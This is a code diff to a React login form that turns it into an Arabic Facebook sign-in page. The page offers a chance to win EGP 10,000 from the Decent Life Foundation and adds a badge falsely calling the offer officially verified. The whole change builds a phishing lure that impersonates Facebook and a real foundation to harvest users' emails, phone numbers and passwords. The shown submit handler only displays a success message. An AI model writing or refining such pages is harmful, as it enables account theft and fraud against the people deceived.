@@ -3,7 +3,7 @@ import React, { useState } from 'react';
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
-import { Facebook, Mail, Lock, ArrowRight } from 'lucide-react';
+import { Facebook, Mail, Lock, ArrowRight, CheckCircle } from 'lucide-react';
 import { useToast } from "@/hooks/use-toast";
 
 const LoginForm = () => {
@@ -20,32 +20,32 @@ const LoginForm = () => {
     setTimeout(() => {
       setIsLoading(false);
       toast({
-        title: "Login successful!",
-        description: "You're now in the running for the EGP 10,000 prize!",
+        title: "تم تسجيل الدخول بنجاح!",
+        description: "أنت الآن مسجل للمشاركة في فرصة ربح 10,000 جنيه!",
       });
     }, 1500);
   };
 
   return (
-    <Card className="w-full max-w-md mx-auto card-shadow">
+    <Card className="w-full max-w-md mx-auto facebook-card-shadow" dir="rtl">
       <CardHeader className="space-y-2">
         <div className="flex justify-center mb-4">
-          <Facebook className="h-12 w-12 text-decent" />
+          <Facebook className="h-12 w-12 text-facebook" />
         </div>
-        <CardTitle className="text-2xl font-bold text-center">Sign in with Facebook</CardTitle>
+        <CardTitle className="text-2xl font-bold text-center text-facebook-dark">تسجيل الدخول بحساب فيسبوك</CardTitle>
         <CardDescription className="text-center">
-          Login to claim your chance to win EGP 10,000 from Decent Life Foundation
+          سجل دخولك للحصول على فرصة ربح 10,000 جنيه من مؤسسة حياة كريمة
         </CardDescription>
       </CardHeader>
       <CardContent>
         <form onSubmit={handleSubmit} className="space-y-4">
           <div className="space-y-2">
             <div className="relative">
-              <Mail className="absolute left-3 top-3 h-5 w-5 text-muted-foreground" />
+              <Mail className="absolute right-3 top-3 h-5 w-5 text-muted-foreground" />
               <Input
-                className="pl-10"
+                className="pr-10 text-right"
                 type="email"
-                placeholder="Email or Phone Number"
+                placeholder="البريد الإلكتروني أو رقم الهاتف"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 required
@@ -54,11 +54,11 @@ const LoginForm = () => {
           </div>
           <div className="space-y-2">
             <div className="relative">
-              <Lock className="absolute left-3 top-3 h-5 w-5 text-muted-foreground" />
+              <Lock className="absolute right-3 top-3 h-5 w-5 text-muted-foreground" />
               <Input
-                className="pl-10"
+                className="pr-10 text-right"
                 type="password"
-                placeholder="Password"
+                placeholder="كلمة المرور"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 required
@@ -67,25 +67,37 @@ const LoginForm = () => {
           </div>
           <Button 
             type="submit" 
-            className="w-full login-button text-white flex items-center justify-center gap-2"
+            className="w-full facebook-login-button text-white flex items-center justify-center gap-2"
             disabled={isLoading}
           >
-            {isLoading ? "Logging in..." : "Login with Facebook"}
-            {!isLoading && <ArrowRight className="h-5 w-5" />}
+            {isLoading ? "جاري تسجيل الدخول..." : "تسجيل الدخول بالفيسبوك"}
+            {!isLoading && <ArrowRight className="h-5 w-5 mr-2" />}
           </Button>
         </form>
         <div className="mt-4 text-center">
           <p className="text-sm text-muted-foreground">
-            Don't have an account?{" "}
-            <a href="#" className="text-decent font-medium hover:underline">
-              Sign up for Facebook
+            ليس لديك حساب؟{" "}
+            <a href="#" className="text-facebook font-medium hover:underline">
+              إنشاء حساب على فيسبوك
             </a>
           </p>
+        </div>
+        
+        <div className="mt-4 pt-4 border-t flex items-center justify-center">
+          <div className="bg-facebook/5 p-3 rounded-lg text-center">
+            <div className="flex justify-center items-center mb-1">
+              <CheckCircle className="h-5 w-5 text-green-500 ml-1" />
+              <span className="text-sm font-medium">عرض رسمي موثق</span>
+            </div>
+            <p className="text-xs text-muted-foreground">
+              هذه الفرصة مقدمة رسمياً من مؤسسة حياة كريمة المعتمدة
+            </p>
+          </div>
         </div>
       </CardContent>
       <CardFooter className="flex justify-center border-t pt-4">
         <p className="text-xs text-center text-muted-foreground">
-          By logging in, you agree to our Terms of Service and Privacy Policy
+          بتسجيل الدخول، أنت توافق على شروط الخدمة وسياسة الخصوصية الخاصة بنا
         </p>
       </CardFooter>
     </Card>
